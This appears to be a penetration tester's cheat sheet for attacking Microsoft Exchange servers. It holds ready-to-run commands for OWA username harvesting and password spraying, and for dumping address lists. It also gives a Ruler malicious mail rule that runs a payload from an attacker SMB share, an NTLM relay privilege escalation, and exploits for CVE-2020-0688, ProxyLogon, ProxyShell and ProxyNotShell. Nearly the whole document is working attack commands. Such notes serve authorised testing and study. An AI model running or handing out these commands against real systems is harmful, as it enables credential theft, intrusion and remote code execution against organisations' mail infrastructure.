# Exchange

# Enum

## Domain info

```powershell
Invoke-DomainHarvestOWA -ExchangeHostname <IP>
```

## Username Enumeration

```powershell
Invoke-UsernameHarvestOWA -UserList .\users.txt -ExchHostname <IP> -Domain domain.com -OutFile validusers.txt
```

## Password Spraying

```powershell
Invoke-PasswordSprayOWA -ExchHostname <IP> -UserList .\validusers.txt -Password Password123 -Outfile creds.txt
```

## Dump info

```powershell
Get-GlobalAddressList -ExchHostname <IP> -Username domain.com\user -Password Password123 -Outfile info.txt
```

```bash
impacket-exchanger domain.com/user:Password@exchangeserver.domain.com -debug nspi list-tables -count
impacket-exchanger domain.com/user:Password@exchangeserver.domain.com -debug nspi dump-tables -guid <GUID> -lookup-type EXTENDED
```

# Foothold

> Posiblemente no ande

```bash
# Validate credentials and check rules
ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
# Malicious rule
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456  add --location '\\10.0.0.5\tools\\evilm64.exe' --trigger "popashell" --name maliciousrule --send --subject popashell
# o 
ruler -u user -p assword -d domain.com -e user@domain.com -k --url https://exchangeIP/autodiscover/autodiscover.xml --verbose --debug add --triger "user" --name evil --location \\\\10.10.10.10\\payload.exe --send
# Delete rule
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456 delete --name maliciousrule
```

# Exploit

## CVE-2020-0688

> Require authentication.

- https://github.com/pwntester/ysoserial.net
- https://github.com/MrTiz/CVE-2020-0688

```powershell
PowerShell.exe -ExecutionPolicy Bypass -File .\CVE-2020-0688.ps1 -Url 'https://<exchange IP>' -Username 'domain\username' -Password 'REDACTED' -Command 'powershell whoami > C:/whoami.txt' -YsoserialPath 'C:\Users\User\Desktop\CVE-2020-0688\ysoserial\ysoserial.exe'
```

## (CVE-2018-8581) PrivExchange

### Required

1. The Exchange Windows Pmermissions had WriteDacl permission on the domain object
2. NTLM Relay from machine accounts
3. Force Exchange to authenticate against the listener via the PushSubscription feature
4. The user should have a mailbox on Exchange Server

```bash
impacket-ntlmrelay -t ldap://<DC IP> --escalate-user user
python3 privexchange.py -ah <attacker IP> exchange.domain.com -u user -d domain.com
```

## CVE-2021-26855 (SSRF)

```bash
# Check
use auxiliary/scanner/http/exchange_proxylogon
# Exploit
use exploit./windows/http/exchange_proxylogon_rce
```

## (CVE-2021-34473, CVE-2021-34523 & CVE-2021-31207) ProxyShell 

```bash
use exploit/windows/http/exchange_proxyshell_rce
```

## (CVE-2022-41040 & CVE-2022-41082) Proxynotshell

> Require authentication. And metasploit is only available for Windows Server 2019

```bash
use exploit/windows/http/exchange_proxynotshell_rce
```



### Links

- https://github.com/dafthack/MailSniper